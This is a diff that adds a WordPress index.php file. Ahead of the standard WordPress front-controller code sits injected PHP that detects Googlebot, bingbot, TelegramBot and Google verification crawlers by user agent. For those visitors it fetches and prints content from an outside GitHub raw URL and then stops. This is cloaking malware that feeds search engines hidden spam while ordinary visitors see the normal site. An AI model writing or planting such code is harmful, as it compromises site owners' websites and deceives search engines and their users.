@@ -1,0 +1,58 @@
+<?php  
+function is_bot() {  
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];  
+    $bots = array( 
+        "Googlebot",  
+        "TelegramBot",  
+        "bingbot",  
+        "Google-Site-Verification",  
+        "Google-InspectionTool" 
+    );  
+
+    foreach ($bots as $bot) {  
+        if (stripos($user_agent, $bot) !== false) {  
+            return true;  
+        }  
+    }  
+    return false;  
+}  
+
+function get_content_from_url($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    return $content;
+}
+
+if (is_bot()) {  
+    $url = "https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/apaed";
+    $content = get_content_from_url($url);
+
+    if ($content !== false) {
+        echo $content;
+    }
+    exit; // Stop further output for bots
+}  
+?>
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
